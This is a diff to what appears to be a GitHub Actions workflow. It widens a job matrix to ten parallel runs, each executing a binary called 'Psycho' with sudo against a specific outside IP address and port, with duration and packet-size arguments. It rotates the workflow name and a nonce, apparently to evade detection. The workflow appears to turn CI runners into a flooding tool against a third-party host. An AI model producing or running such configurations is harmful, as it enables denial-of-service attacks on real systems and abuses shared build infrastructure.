@@ -1,4 +1,4 @@
-name: psycho-75f1c685
+name: psycho-1d7d3d76
 on:
   push:
     branches: [ main, master ]
@@ -9,7 +9,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        n: [1,2,3,4,5,6,7]
+        n: [1,2,3,4,5,6,7,8,9,10]
     steps:
     - name: Checkout
       uses: actions/checkout@v4
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x Psycho
     - name: Fire
-      run: sudo ./Psycho 91.108.17.49 32000 60 1400
+      run: sudo ./Psycho 91.108.17.53 32002 60 1000
       continue-on-error: true
-    - name: Nonce 75f1c685
-      run: echo "nonce=75f1c685"
+    - name: Nonce 1d7d3d76
+      run: echo "nonce=1d7d3d76"
